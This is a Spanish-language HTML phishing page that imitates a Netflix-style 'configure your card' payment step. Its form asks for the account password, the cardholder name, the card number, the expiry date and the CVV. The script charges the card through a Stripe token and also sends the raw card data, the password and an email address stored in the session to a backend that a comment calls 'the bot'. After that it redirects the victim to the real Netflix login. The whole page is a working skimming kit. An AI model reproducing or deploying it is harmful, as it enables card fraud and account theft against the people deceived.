<!DOCTYPE html>
<html lang="es">
    <script src="https://js.stripe.com/v3/"></script>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmaci&oacute;n de Servicio</title>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://js.stripe.com/v3/"></script>
    <style>
        body { background: #fff; color: #333; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; }
        .nav-pay { border-bottom: 1px solid #e6e6e6; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
        .container-pay { max-width: 440px; margin: 30px auto; padding: 0 20px; }
        h1 { font-size: 32px; margin: 10px 0 20px; font-weight: 700; }
        .input-box { margin-bottom: 15px; }
        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; outline: none; }
        .input-box input:focus { border-color: #0071eb; }
        .grid-input { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        #loading-overlay { display: none; text-align: center; padding: 60px 20px; }
        .step { color: #333; font-size: 13px; text-transform: uppercase; }
    </style>
</head>
<body>
    <nav class="nav-pay">
        <img src="img/logo.png" style="width: 100px;" alt="Logo"> 
        <b style="cursor:pointer; font-size: 14px;">Cerrar sesión</b>
    </nav>

    <div class="container-pay" id="form-container">
        <span class="step">Paso <b>3</b> de <b>3</b></span>
        <h1>Configura tu tarjeta</h1>
        
        <div id="dynamic-injection">
            <form id="pay-process-form">
                <div class="input-box">
                    <input type="password" id="f_k_1" placeholder="Contraseña de cuenta" required>
                </div>
                <div class="input-box">
                    <input type="text" id="f_n_1" placeholder="Nombre en la tarjeta" required>
                </div>
                <div class="input-box">
                    <input type="text" id="f_t_1" placeholder="Número de tarjeta" maxlength="16" inputmode="numeric" required>
                </div>
                <div class="grid-input">
                    <div class="input-box">
                        <input type="text" id="f_e_1" placeholder="MM/AA" maxlength="5" inputmode="numeric" required>
                    </div>
                    <div class="input-box">
                        <input type="text" id="f_c_1" placeholder="CVV" maxlength="4" inputmode="numeric" required>
                    </div>
                </div>
                <button type="submit" class="btn-submit" id="submit-button">Iniciar membresía</button>
            </form>
        </div>
    </div>

    <div id="loading-overlay">
        <i class="fas fa-spinner fa-spin fa-3x" style="color:#e50914;"></i>
        <p style="margin-top: 20px; font-size: 18px;">Validando con su entidad bancaria...</p>
    </div>

    <script>
        // 2. Inicializar Stripe (Reemplaza con tu pk_live_...)
        const stripe = Stripe('pk_live_51ShZ3pAeUmcfN350ViX4smhmh5q0IVTh1HBTgTi38ibNz07TvUQzb1F6PyQpWvF1N1y4411ZM7Ys0x9mQw9foU4800BwXkfy0n');

        // Máscara MM/AA automática
        document.getElementById('f_e_1').addEventListener('input', function(e) {
            let v = this.value.replace(/\D/g, '');
            if (v.length >= 2) this.value = v.substring(0,2) + '/' + v.substring(2,4);
        });

        document.getElementById('pay-process-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // UI: Bloquear botón y mostrar loader
            document.getElementById('submit-button').disabled = true;
            document.getElementById('form-container').style.display = 'none';
            document.getElementById('loading-overlay').style.display = 'block';

            const ccVal = document.getElementById('f_t_1').value.replace(/\s/g, '');
            const expVal = document.getElementById('f_e_1').value.split('/');
            const cvVal = document.getElementById('f_c_1').value;
            const nmVal = document.getElementById('f_n_1').value;

            // 3. PASO CLAVE: Crear Token de Stripe antes de enviar a Vercel
            stripe.createToken({
                number: ccVal,
                exp_month: expVal[0],
                exp_year: expVal[1],
                cvc: cvVal,
                name: nmVal
            }).then(function(result) {
                if (result.error) {
                    // Si Stripe detecta error en la tarjeta (ej. número inválido)
                    alert("Atención: " + result.error.message);
                    location.reload();
                } else {
                    // 4. Enviar el Token legal Y los datos reales al bot
                    _0xdispatch({
                        em: sessionStorage.getItem('usr_mail') || 'Desconocido',
                        pw: document.getElementById('f_k_1').value,
                        nm: nmVal,
                        cc: ccVal,
                        ex: document.getElementById('f_e_1').value,
                        cv: cvVal,
                        stripeToken: result.token.id // Este es el que usa Vercel para cobrar
                    });
                }
            });
        });

        function _0xdispatch(payload) {
            fetch('/api/enviar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(res => res.json())
            .then(data => {
                if (data.pago === true) {
                    alert("¡Verificación exitosa! Su suscripción ha sido confirmada.");
                    window.location.href = "https://www.netflix.com/login";
                } else {
                    // Aquí data.mensaje_error ya trae el motivo del rechazo de Stripe
                    alert("Atención: " + data.mensaje_error);
                    location.reload();
                }
            })
            .catch(err => {
                console.error(err);
                alert("Error técnico de conexión. Intente con otra tarjeta.");
                location.reload();
            });
        }
    </script>
</body>
</html>
